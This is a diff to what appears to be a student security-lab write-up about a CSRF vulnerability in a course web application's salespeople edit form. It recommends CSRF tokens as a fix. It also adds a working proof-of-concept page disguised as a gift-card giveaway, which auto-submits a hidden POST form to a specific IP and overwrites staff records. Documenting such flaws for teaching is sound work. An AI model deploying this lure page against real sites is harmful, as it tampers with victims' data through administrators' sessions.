@@ -53,7 +53,22 @@ Description: Insecure Direct Object Reference occured when modifying the id para
 
 Vulnerability #2: Cross-Site Request Forgery (CSRF)
 
-Description:
+Description: Cross-Site Request Forgery cause a forge post request to modify information in the Salespeople database using a malicious HTML page in the user session hidden iframe. CSRF will run once an administrator account user access the page. Developers should require CSRF tokens on the Salespeople edit form submit database and disallow loading responses onto hidden iframe. Below is the HTML code that secretly loads the page and hides the outcome.
+ <!DOCTYPE html>
+<html>
+  <head>
+    <title>$100 Gift Cards Giveaways</title>
+  </head>
+  <body onload="document.my_form.submit()">
+    <form action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=1" method="POST" name="my_form" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="GOT HACKED DARON" />
+      <input type="text" name="last_name" value="GOT HACKED BURKE" />
+      <input type="text" name="phone" value="123-456-7890" />
+      <input type="text" name="email" value="DARONBURKE@HACKED.COM" />
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html>
 
 <img src="red-CSRF.gif">
 
